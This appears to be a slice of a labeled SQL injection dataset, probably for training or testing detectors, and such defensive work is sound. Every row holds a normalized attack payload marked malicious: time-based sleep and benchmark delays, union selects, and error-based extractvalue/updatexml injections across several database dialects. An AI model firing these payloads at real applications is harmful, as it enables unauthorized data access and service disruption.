row_index,payload_norm,label,sqli_type_hint
4620,1 where 7452 = 7452 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,1,
4621,"1 ) ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( 7200 = 7200",1,
4622,"-3769"" ) ) ) union all select 8456#",1,
4623,1'+ ( select 'vjoj' where 5348 = 5348,1,
4624,"1%' ) ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
4625,1' ) ) ) or sleep ( 5 ) and ( ( ( 'ecur' = 'ecur,1,
4626,-4828%' ) or 8678 = 5745#,1,
4627,"1%"" ) ) ) union all select null,null,null,null,null,null,null,null#",1,
4628,"1"" ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( ""afby"" = ""afby",1,
4629,"-7518"" or elt ( 8413 = 3995,3995 ) and ""cpnf"" = ""cpnf",1,
4630,"1' ) ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( ( 'yqhk' = 'yqhk",1,
4631,"1'|| ( select 'xuou' from dual where 7681 = 7681 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) ) ||'",1,
4632,"1"" ) and 7533 = 7533 and ( ""yqzq"" = ""yqzq",1,
4633,1 ) ) as vryv where 5600 = 5600,1,
4634,"-5013' ) ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 'ehwh' like 'ehwh",1,
4635,"-3441' ) ) as dxvt where 9291 = 9291 union all select 9291,9291,9291#",1,
4636,"1"" ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ""dqis"" = ""dqis",1,
4637,"1 ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( 1773 = 1773",1,
4638,"1 ) ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
4639,"1"" ) ) union all select null,null,null,null,null,null#",1,
4640,1 where 3502 = 3502 order by 1--,1,
4641,"1'+ ( select 'ejox' where 2719 = 2719 union all select null,null,null#",1,
4642,1%' ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,1,
4643,"1'+ ( select inyd where 1668 = 1668 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) ) +'",1,
4644,1' where 7828 = 7828 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,1,
4645,"-3865' ) union all select 4935,4935,4935,4935,4935--",1,
4646,"1"" where 6200 = 6200 and elt ( 1210 = 1210,sleep ( 5 ) ) --",1,
4647,1'+ ( select zwsr where 6567 = 6567,1,
4648,1' ) and 8404 = 8651#,1,
4649,"1%"" and 4595 = 4595#",1,
